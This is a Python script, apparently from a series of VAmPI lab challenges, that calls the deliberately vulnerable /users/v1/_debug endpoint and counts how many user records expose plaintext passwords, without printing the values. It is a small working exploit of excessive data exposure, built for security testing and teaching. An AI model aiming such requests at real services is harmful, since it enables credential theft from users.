#!/usr/bin/env python3
"""
vampi_challenge_01_excessive_data_exposure.py — Excessive Data Exposure.

VAmPI's GET /users/v1/_debug returns EVERY user's plaintext password (plus
admin flag) to any caller. We fetch it and report how many accounts have
their password exposed — the "Broken Object Property Level Authorization" /
sensitive-data exposure pattern.

We deliberately do NOT print the secret values themselves — only count + keys.
Run: python3 vampi_challenge_01_excessive_data_exposure.py [--config ...]
"""
import argparse
import os
import sys

import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import vampi_common as vc


def find_config():
    if os.path.exists("vampi_config.yaml"):
        return "vampi_config.yaml"
    return os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "vampi_config.yaml")


def main():
    ap = argparse.ArgumentParser(description="Excessive data exposure via /users/v1/_debug")
    ap.add_argument("--config", default=find_config())
    args = ap.parse_args()

    cfg = vc.load_config(args.config)
    base = vc.base_url(cfg)
    tout = vc.timeout(cfg)

    r = requests.get(f"{base}/users/v1/_debug", headers=vc.consumer_headers(801), timeout=tout)
    users = vc.as_list(r.json())
    exposed = [u for u in users if isinstance(u, dict) and "password" in u]
    keys = sorted(set(k for u in users if isinstance(u, dict) for k in u))

    print(f"GET /users/v1/_debug -> HTTP {r.status_code}")
    print(f"  {len(users)} user record(s); keys present: {keys}")
    if "password" in keys:
        print(f"[FINDING] {len(exposed)}/{len(users)} records expose a plaintext 'password' field.")
    else:
        print("[ok] no 'password' field exposed in this response.")


if __name__ == "__main__":
    main()
